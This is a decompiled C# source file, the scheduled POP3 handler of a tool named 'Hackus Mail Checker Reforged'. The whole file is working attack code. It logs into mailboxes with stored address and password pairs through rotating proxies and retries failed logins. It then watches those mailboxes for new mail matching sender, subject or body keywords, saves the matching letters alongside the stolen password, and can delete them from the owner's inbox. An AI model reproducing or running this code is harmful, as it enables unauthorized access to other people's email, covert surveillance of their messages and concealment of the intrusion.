using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Threading;
using Hackus_Mail_Checker_Reforged.Components.Scheduler.Models;
using Hackus_Mail_Checker_Reforged.Components.Scheduler.Models.Contexts;
using Hackus_Mail_Checker_Reforged.Models;
using Hackus_Mail_Checker_Reforged.Models.Enums;
using Hackus_Mail_Checker_Reforged.Net.Mail;
using Hackus_Mail_Checker_Reforged.Net.Mail.IMAP;
using Hackus_Mail_Checker_Reforged.Net.Mail.Message;
using Hackus_Mail_Checker_Reforged.Net.Mail.POP3;
using Hackus_Mail_Checker_Reforged.Net.Mail.Utilities;
using Hackus_Mail_Checker_Reforged.Services.Managers;
using Hackus_Mail_Checker_Reforged.Services.Settings;
using HandyControl.Tools;
using HandyControl.Tools.Extension;
using xNet;

namespace Hackus_Mail_Checker_Reforged.Components.Scheduler.Handlers
{
	// Token: 0x020001ED RID: 493
	public class ScheduledPop3Handler : IMailHandler
	{
		// Token: 0x170002B3 RID: 691
		// (get) Token: 0x06000E56 RID: 3670 RVA: 0x00006D62 File Offset: 0x00004F62
		private SearchSettings SearchSettings
		{
			get
			{
				return SearchSettings.Instance;
			}
		}

		// Token: 0x06000E57 RID: 3671 RVA: 0x0000E46F File Offset: 0x0000C66F
		public ScheduledPop3Handler(ScheduledMail mailbox, Server server)
		{
			this._mailbox = mailbox;
			this._server = server;
			if (mailbox.Context == null)
			{
				mailbox.Context = new Pop3Context();
			}
			this._context = (Pop3Context)mailbox.Context;
		}

		// Token: 0x06000E58 RID: 3672 RVA: 0x00048FAC File Offset: 0x000471AC
		public OperationResult Connect(ProxyClient proxyClient)
		{
			OperationResult result;
			try
			{
				this._tcpClient = proxyClient.CreateConnection(this._server.Hostname, this._server.Port, null);
				if (this._tcpClient != null && this._tcpClient.Connected)
				{
					result = OperationResult.Ok;
				}
				else
				{
					result = OperationResult.Error;
				}
			}
			catch (SocketException ex)
			{
				if (this._tcpClient != null && this._tcpClient.Connected)
				{
					this._tcpClient.DisposeObject();
				}
				if (ex.SocketErrorCode == SocketError.HostNotFound)
				{
					result = OperationResult.HostNotFound;
				}
				else
				{
					result = OperationResult.Error;
				}
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
				if (this._tcpClient != null && this._tcpClient.Connected)
				{
					this._tcpClient.DisposeObject();
				}
				result = OperationResult.Error;
			}
			return result;
		}

		// Token: 0x06000E59 RID: 3673 RVA: 0x00049080 File Offset: 0x00047280
		public OperationResult Login(out ExceptionType exceptionType)
		{
			exceptionType = ExceptionType.Undefined;
			this._pop3Client = new Pop3Client();
			int num = CheckerSettings.Instance.Timeout * 1000;
			this._pop3Client.ConnectTimeout = num;
			this._pop3Client.ReadWriteTimeout = num;
			OperationResult result;
			try
			{
				this._pop3Client.Connect(this._server.Hostname, this._server.Port, this._server.Socket == Hackus_Mail_Checker_Reforged.Models.Enums.SocketType.SSL, this._tcpClient);
				this._pop3Client.Authenticate(this._mailbox.Address, this._mailbox.Password);
				result = OperationResult.Ok;
			}
			catch (SocketException ex)
			{
				if (ex.SocketErrorCode == SocketError.HostNotFound)
				{
					result = OperationResult.HostNotFound;
				}
				else
				{
					result = OperationResult.Error;
				}
			}
			catch (MailException)
			{
				result = OperationResult.Bad;
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
				result = OperationResult.Error;
			}
			return result;
		}

		// Token: 0x06000E5A RID: 3674 RVA: 0x0000E4A9 File Offset: 0x0000C6A9
		public OperationResult SelectFolder(Hackus_Mail_Checker_Reforged.Net.Mail.IMAP.Folder folder)
		{
			return OperationResult.Ok;
		}

		// Token: 0x06000E5B RID: 3675 RVA: 0x00049178 File Offset: 0x00047378
		public void SearchMessages()
		{
			int messagesCount = this.GetMessagesCount();
			if (messagesCount < 1)
			{
				return;
			}
			if (this._context.IsInitialized && messagesCount > this._context.LastCount)
			{
				List<Hackus_Mail_Checker_Reforged.Net.Mail.Message.MailMessage> savedMessages = new List<Hackus_Mail_Checker_Reforged.Net.Mail.Message.MailMessage>();
				List<decimal> checkedUids = new List<decimal>();
				List<Request> list = new List<Request>();
				OperationResult operationResult = OperationResult.Retry;
				int num = 0;
				while (operationResult == OperationResult.Retry)
				{
					operationResult = this.ProcessSearch(messagesCount, savedMessages, checkedUids, list);
					if (operationResult == OperationResult.Error)
					{
						if (num >= 2)
						{
							break;
						}
						num++;
						operationResult = OperationResult.Retry;
					}
					if (operationResult != OperationResult.Ok && !this.Reconnect())
					{
						break;
					}
				}
				this._context.LastCount = messagesCount;
				HashSet<Uid> hashSet = new HashSet<Uid>();
				using (List<Request>.Enumerator enumerator = list.GetEnumerator())
				{
					while (enumerator.MoveNext())
					{
						Request request = enumerator.Current;
						int finded = SchedulerSettings.Instance.DownloadMails ? request.SavedUids.Count : request.FindedUids.Count;
						if (finded > 0)
						{
							DispatcherHelper.RunOnMainThread(delegate
							{
								Scheduler.Instance.AddNotification(new Notification
								{
									Address = this._mailbox.Address,
									Message = ScheduledPop3Handler.<>c__DisplayClass12_0.smethod_0(<Module>.smethod_5<string>(-1781723149), finded, request),
									Time = DateTime.Now
								});
							});
						}
						if (SchedulerSettings.Instance.DeleteMails)
						{
							hashSet.AddRange(request.SavedUids);
						}
					}
				}
				if (hashSet.Any<Uid>())
				{
					this.DeleteMessages(hashSet);
					int messagesCount2 = this.GetMessagesCount();
					if (messagesCount2 != -1 && messagesCount2 != messagesCount)
					{
						this._context.LastCount = messagesCount2;
					}
					this.Quit();
				}
				return;
			}
			this._context.LastCount = messagesCount;
			this._context.IsInitialized = true;
		}

		// Token: 0x06000E5C RID: 3676 RVA: 0x00049328 File Offset: 0x00047528
		private OperationResult ProcessSearch(int count, List<Hackus_Mail_Checker_Reforged.Net.Mail.Message.MailMessage> savedMessages, List<decimal> checkedUids, List<Request> checkedRequests)
		{
			Request request3 = null;
			try
			{
				while (count > this._context.LastCount)
				{
					if (!savedMessages.Any((Hackus_Mail_Checker_Reforged.Net.Mail.Message.MailMessage m) => m.Uid.UID == count))
					{
						Hackus_Mail_Checker_Reforged.Net.Mail.Message.MailMessage item = this._pop3Client.FetchMessage(new Uid(count), true, true);
						savedMessages.Add(item);
					}
					int i = count;
					count = i - 1;
				}
				int j = 0;
				while (j < savedMessages.Count)
				{
					try
					{
						if (!checkedUids.Contains(savedMessages[j].Uid.UID))
						{
							if (savedMessages[j] != null)
							{
								Uid uid = new Uid(savedMessages[j].Uid.UID);
								using (IEnumerator<Request> enumerator = SchedulerSettings.Instance.Requests.GetEnumerator())
								{
									while (enumerator.MoveNext())
									{
										Request request = enumerator.Current;
										Request request2 = checkedRequests.FirstOrDefault((Request r) => ScheduledPop3Handler.<>c__DisplayClass13_1.smethod_0(r.Sender, request.Sender) && ScheduledPop3Handler.<>c__DisplayClass13_1.smethod_0(r.Body, request.Body) && ScheduledPop3Handler.<>c__DisplayClass13_1.smethod_0(r.Subject, request.Subject));
										if (request2 != null)
										{
											if (request2.IsChecked)
											{
												continue;
											}
										}
										else
										{
											request2 = request.Clone();
											request2.FindedUids = new HashSet<Uid>();
											request2.SavedUids = new HashSet<Uid>();
											checkedRequests.Add(request2);
										}
										request3 = request2;
										if (request2.Sender != null && request2.Body == null && request2.Subject == null)
										{
											if (!string.IsNullOrEmpty(savedMessages[j].From) && savedMessages[j].From.ContainsIgnoreCase(request2.Sender))
											{
												request2.AddFindedUid(uid);
												if (SchedulerSettings.Instance.DownloadMails)
												{
													savedMessages[j] = this._pop3Client.FetchMessage(uid, false, true);
													if (savedMessages[j].AlternateViews.Count != 0)
													{
														request2.SavedUids.Add(uid);
														SchedulerFileManager.SaveLetter(this._mailbox.Address, this._mailbox.Password, request2.ToString(), savedMessages[j]);
													}
												}
											}
										}
										else if (request2.Sender == null && request2.Body == null && request2.Subject != null)
										{
											if (!string.IsNullOrEmpty(savedMessages[j].Subject) && savedMessages[j].Subject.ContainsIgnoreCase(request2.Subject))
											{
												request2.AddFindedUid(uid);
												if (SchedulerSettings.Instance.DownloadMails)
												{
													savedMessages[j] = this._pop3Client.FetchMessage(uid, false, !this.SearchSettings.SearchAttachments);
													if (savedMessages[j].AlternateViews.Count != 0)
													{
														request2.SavedUids.Add(uid);
														SchedulerFileManager.SaveLetter(this._mailbox.Address, this._mailbox.Password, request2.ToString(), savedMessages[j]);
													}
												}
											}
										}
										else if (request2.Sender != null && request2.Body == null && request2.Subject != null)
										{
											if (!string.IsNullOrEmpty(savedMessages[j].From) && savedMessages[j].From.ContainsIgnoreCase(request2.Sender) && !string.IsNullOrEmpty(savedMessages[j].Subject) && savedMessages[j].Subject.ContainsIgnoreCase(request2.Subject))
											{
												request2.AddFindedUid(uid);
												if (SchedulerSettings.Instance.DownloadMails)
												{
													savedMessages[j] = this._pop3Client.FetchMessage(uid, false, true);
													if (savedMessages[j].AlternateViews.Count != 0)
													{
														request2.SavedUids.Add(uid);
														SchedulerFileManager.SaveLetter(this._mailbox.Address, this._mailbox.Password, request2.ToString(), savedMessages[j]);
													}
												}
											}
										}
										else if (request2.Sender == null && request2.Body != null && request2.Subject == null)
										{
											if (savedMessages[j].AlternateViews.Count == 0)
											{
												savedMessages[j] = this._pop3Client.FetchMessage(uid, false, true);
											}
											if (!string.IsNullOrEmpty(savedMessages[j].Body) && savedMessages[j].Body.ContainsIgnoreCase(request2.Body))
											{
												request2.AddFindedUid(uid);
												if (SchedulerSettings.Instance.DownloadMails && savedMessages[j].AlternateViews.Count != 0)
												{
													request2.SavedUids.Add(uid);
													SchedulerFileManager.SaveLetter(this._mailbox.Address, this._mailbox.Password, request2.ToString(), savedMessages[j]);
												}
											}
										}
										else if (request2.Sender != null && request2.Body != null && request2.Subject == null)
										{
											if (!string.IsNullOrEmpty(savedMessages[j].From) && savedMessages[j].From.ContainsIgnoreCase(request2.Sender))
											{
												if (savedMessages[j].AlternateViews.Count == 0)
												{
													savedMessages[j] = this._pop3Client.FetchMessage(uid, false, true);
												}
												if (!string.IsNullOrEmpty(savedMessages[j].Body) && savedMessages[j].Body.ContainsIgnoreCase(request2.Body))
												{
													request2.AddFindedUid(uid);
													if (SchedulerSettings.Instance.DownloadMails && savedMessages[j].AlternateViews.Count != 0)
													{
														request2.SavedUids.Add(uid);
														SchedulerFileManager.SaveLetter(this._mailbox.Address, this._mailbox.Password, request2.ToString(), savedMessages[j]);
													}
												}
											}
										}
										else if (request2.Sender == null && request2.Body != null && request2.Subject != null)
										{
											if (!string.IsNullOrEmpty(savedMessages[j].Subject) && savedMessages[j].Subject.ContainsIgnoreCase(request2.Subject))
											{
												if (savedMessages[j].AlternateViews.Count == 0)
												{
													savedMessages[j] = this._pop3Client.FetchMessage(uid, false, true);
												}
												if (!string.IsNullOrEmpty(savedMessages[j].Body) && savedMessages[j].Body.ContainsIgnoreCase(request2.Body))
												{
													request2.AddFindedUid(uid);
													if (SchedulerSettings.Instance.DownloadMails && savedMessages[j].AlternateViews.Count != 0)
													{
														request2.SavedUids.Add(uid);
														SchedulerFileManager.SaveLetter(this._mailbox.Address, this._mailbox.Password, request2.ToString(), savedMessages[j]);
													}
												}
											}
										}
										else if (request2.Sender != null && request2.Body != null && request2.Subject != null && !string.IsNullOrEmpty(savedMessages[j].From) && savedMessages[j].From.ContainsIgnoreCase(request2.Sender) && !string.IsNullOrEmpty(savedMessages[j].Subject) && savedMessages[j].Subject.ContainsIgnoreCase(request2.Subject))
										{
											if (savedMessages[j].AlternateViews.Count == 0)
											{
												savedMessages[j] = this._pop3Client.FetchMessage(uid, false, true);
											}
											if (!string.IsNullOrEmpty(savedMessages[j].Body) && savedMessages[j].Body.ContainsIgnoreCase(request2.Body))
											{
												request2.AddFindedUid(uid);
												if (SchedulerSettings.Instance.DownloadMails && savedMessages[j].AlternateViews.Count != 0)
												{
													request2.SavedUids.Add(uid);
													SchedulerFileManager.SaveLetter(this._mailbox.Address, this._mailbox.Password, request2.ToString(), savedMessages[j]);
												}
											}
										}
									}
								}
								goto IL_915;
							}
							checkedUids.Add(savedMessages[j].Uid.UID);
						}
					}
					catch (ThreadAbortException)
					{
						throw;
					}
					catch (Exception ex)
					{
						if ((!(ex is IOException) && !(ex is SocketException) && !(ex is TimeoutException) && !(ex is ArgumentNullException) && !(ex is NullReferenceException)) || request3 == null)
						{
							goto IL_915;
						}
						if (request3.Errors <= 2)
						{
							request3.Errors++;
							request3.IsChecked = false;
							return OperationResult.Retry;
						}
						request3.IsChecked = true;
						return OperationResult.Retry;
					}
					IL_90C:
					j++;
					continue;
					IL_915:
					checkedUids.Add(savedMessages[j].Uid.UID);
					goto IL_90C;
				}
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch (Exception)
			{
				return OperationResult.Error;
			}
			return OperationResult.Ok;
		}

		// Token: 0x06000E5D RID: 3677 RVA: 0x00049CF0 File Offset: 0x00047EF0
		private int GetMessagesCount()
		{
			for (int i = 0; i < CheckerSettings.Instance.Rebrute + 1; i++)
			{
				try
				{
					return this._pop3Client.GetMessagesCount();
				}
				catch (ThreadAbortException)
				{
					throw;
				}
				catch (MailException)
				{
					return -1;
				}
				catch
				{
				}
			}
			return -1;
		}

		// Token: 0x06000E5E RID: 3678 RVA: 0x00049D5C File Offset: 0x00047F5C
		private void DeleteMessages(IEnumerable<Uid> uids)
		{
			foreach (Uid uid in uids)
			{
				try
				{
					this._pop3Client.DeleteMessage(uid.UID);
				}
				catch (ThreadAbortException)
				{
					throw;
				}
				catch (MailException)
				{
					break;
				}
				catch
				{
				}
			}
		}

		// Token: 0x06000E5F RID: 3679 RVA: 0x00049DE0 File Offset: 0x00047FE0
		private void Quit()
		{
			try
			{
				this._pop3Client.Quit();
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
			}
		}

		// Token: 0x06000E60 RID: 3680 RVA: 0x00049E1C File Offset: 0x0004801C
		private bool Reconnect()
		{
			for (int i = 0; i < CheckerSettings.Instance.Rebrute + 1; i++)
			{
				if (SchedulerSettings.Instance.UseProxy)
				{
					OperationResult operationResult = this.CreateConnection();
					if (operationResult == OperationResult.HostNotFound || operationResult == OperationResult.Error)
					{
						return false;
					}
				}
				ExceptionType exceptionType;
				OperationResult operationResult2 = this.Login(out exceptionType);
				if (operationResult2 == OperationResult.Ok)
				{
					return true;
				}
				if (operationResult2 == OperationResult.Blocked)
				{
					return false;
				}
				if (operationResult2 != OperationResult.Error)
				{
					this._pop3Client.Dispose();
					return false;
				}
				this._pop3Client.Dispose();
			}
			return false;
		}

		// Token: 0x06000E61 RID: 3681 RVA: 0x00049E90 File Offset: 0x00048090
		private OperationResult CreateConnection()
		{
			OperationResult operationResult;
			do
			{
				ProxyClient proxy = ProxyManager.Instance.GetProxy();
				operationResult = this.Connect(proxy);
			}
			while (operationResult == OperationResult.Error);
			return operationResult;
		}

		// Token: 0x06000E62 RID: 3682 RVA: 0x0000E4AC File Offset: 0x0000C6AC
		public void Dispose()
		{
			this._pop3Client.Dispose();
		}

		// Token: 0x040007A7 RID: 1959
		private TcpClient _tcpClient;

		// Token: 0x040007A8 RID: 1960
		private ScheduledMail _mailbox;

		// Token: 0x040007A9 RID: 1961
		private Server _server;

		// Token: 0x040007AA RID: 1962
		private Pop3Client _pop3Client;

		// Token: 0x040007AB RID: 1963
		private Pop3Context _context;

		// Token: 0x040007AC RID: 1964
		private Hackus_Mail_Checker_Reforged.Net.Mail.IMAP.Folder _folder;
	}
}
